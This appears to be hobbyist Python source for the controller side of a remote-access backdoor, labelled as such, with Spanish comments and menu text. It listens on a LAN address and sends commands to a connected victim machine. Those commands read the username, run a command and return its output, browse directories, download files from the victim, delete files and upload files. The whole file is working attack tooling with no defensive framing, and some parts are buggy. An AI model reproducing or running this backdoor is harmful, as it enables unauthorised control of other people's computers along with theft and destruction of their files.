#backdoor python

import os, sys, getopt
import socket

""" config por defecto s = socket.socket()
host = socket.gethostname()
port = 8080
s.bind((host, port))"""
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.0.10"
port = 8080
s.bind((host, port))
print("")
print(" Servidor esta corriendo en la ip ",host," junto con el puerto ",port)
print("")
print(" Esperando conexiones...")
s.listen(5)
conn, addr = s.accept()
print("")
print(addr[0], " Haz obtenido una conexion exitosa")
print("Pronto acomodo esta parte, para que quede mejor tanto de manera visual, \n"
      + "Comandos : \n"
      + "* username : Nombre de usuario del cliente \n"
      + "* view_cmd : Sirve para saber donde esta ubicado actualmente \n"
      + "**custom_dir : Es para cambiar de directorio y visualizar los datos de dicho directorio \n"
      + "* change_dir : Sirve para cambiar de directorios dentro del cliente y de una vez mirar los archivos que tiene \n"
      + "* download_file : El mismo nombre lo dice, sirve para descargar algun archivo que esta dentro del cliente \n"
      + "* remove_file : Para eliminar un directorio o un archivo (no testeado) \n"
      + "* send_file : Comando para enviar un archivo desde el servidor al cliente (no testeado) \n"
      + "* exit : Salir (no tiene mas explicacion) \n"
      + "* __________________________________________________________________________________________________________ \n"
      + "* Por el momento es algo basico me costo solo 1 noche para entender como funciona y como implementar, 0 errores ")

#conexiones completadas

#envio de comandos

while True:
    print("")
    comando = input(str("Comando >> "))
    if comando == "username":
        conn.send(comando.encode())
        print("")
        print("Nombre de usuario del cliente...")
        print("")
        username = conn.recv(5000)
        username = username.decode()
        print(username)
    elif comando == "view_cmd":
        conn.send(comando.encode())
        print("")
        print("Esperando el envio de comando para su ejecucion...")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Salida del comando : ", files)

    elif comando == "change_dir":
        conn.send(comando.encode())
        print("")
        change_dir = input(str("Ingrese la ruta para poder cambiar: "))
        conn.send(change_dir.encode())
        print("")
        print("Comando a sido enviado")
        print("")
        path = conn.recv(5000)
        files = conn.recv(5000)
        path = path.decode()
        files = files.decode()
        print("Directorio cambiado a : ", path, " junto con sus archivos: ", files)

    elif comando == "download_file":
        conn.send(comando.encode())
        filepath = input(str("Ingrese la ruta completa junto con el archivo a descargar: "))
        conn.send(filepath.encode())
        file = conn.recv(100000)
        filename = input(str("Ingrese el nombre del archivo para luego ser descargado: "))
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print(filename, " fue descargado y guardado")
        print("")
        

    elif comando == "remove_file":
        conn.send(comando.encode())
        fileanddir = input(str("Ingrese el directorio y archivo: "))
        conn.send(fileanddir.encode())
        print("")
        print("Comando ejecutado con exito")

    elif comando == "send_files":
        conn.send(comando.encode())
        file = input(str("Ingresar el nombre archivo y directorio de el archivo: "))
        data = open(file, "rb")
        file_data = data.read(7000) #cambiar cuando el archivo sea grande
        conn.send(filename.encode())
        print(file, " a sido enviado exitosamente")
        conn.send(file_data)

    elif comando == "exit":
        conn.send(comando.encode())
        print("")
        print("Deteniendo ejecucion...")
        print("")
        salir = conn.recv(5000)
        salir = salir.decode()
        sys.exit(0)

    else:
        print("")
        print("Comando no reconocido")


"""
lo que alguna vez fue codigo original,
    elif comando == "custom_dir":
        conn.send(comando.encode())
        print("")
        user_input = input(str("Custom dir: "))
        conn.send(user_input.encode())
        print("")
        print("Comando a sido enviado")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Custom Dir Result : ", files)
    """
